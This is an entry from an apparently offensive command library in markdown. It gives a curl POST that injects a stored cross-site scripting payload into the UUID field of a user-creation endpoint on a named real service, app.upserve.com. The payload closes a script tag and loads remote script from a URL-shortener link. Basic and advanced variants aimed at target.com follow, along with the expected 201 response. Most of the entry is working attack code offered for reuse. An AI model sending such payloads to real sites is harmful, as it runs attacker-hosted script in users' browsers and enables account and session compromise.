---
id: cmd-post-xss-form
data: >-
  curl -X POST https://app.upserve.com/c/user -H "Accept: application/json" -H
  "Accept-Language: en-US,en;q=0.5" -H "X-Requested-With: XMLHttpRequest" -H
  "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "Referer:
  https://app.upserve.com/settings/account" -H "Content-Length: 134" -H "DNT: 1"
  -H "Connection: close" -d "uuid=</script><script
  src=//is.gd/z0i2sU>&email=your.email@example.com&brand_pretty_url=test-brand"
tags:
  - xss
  - post-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.091Z'
verified: false
validated: true
submitted: true
---
# post-create-user-with-xss-uuid-form-urlencoded

## Command

```bash
curl -X POST https://app.upserve.com/c/user \
  -H "Accept: application/json" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
  -H "Referer: https://app.upserve.com/settings/account" \
  -H "Content-Length: 134" \
  -H "DNT: 1" \
  -H "Connection: close" \
  -d "uuid=\</script\><script src=//is.gd/z0i2sU>&email=your.email@example.com&brand_pretty_url=test-brand"
```

## Description

Sends a POST request to create a user account with a malicious UUID containing an XSS payload using form-urlencoded content type. Useful for initial PoC in web apps lacking input validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `uuid` | Malicious payload string | Yes |
| `email` | Target email for confirmation | Yes |
| `brand_pretty_url` | Brand identifier | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/c/user -d "uuid=\</script\><script src=//short.url>&email=test@example.com&brand_pretty_url=test"
```

### Advanced Usage

Add cookies or auth headers if needed:

```bash
curl -X POST https://target.com/c/user -H "Cookie: session=abc" -d "uuid=\</script\><script src=//short.url>&email=test@example.com&brand_pretty_url=test"
```

## Expected Output

HTTP/1.1 201 Created with JSON response containing account details and confirmation instructions. Check if UUID in response matches payload or was overridden.

## Related

- [[commands/post-create-user-with-xss-uuid-json]]
- [[procedures/Submit-Malicious-UUID-for-Account-Creation]]
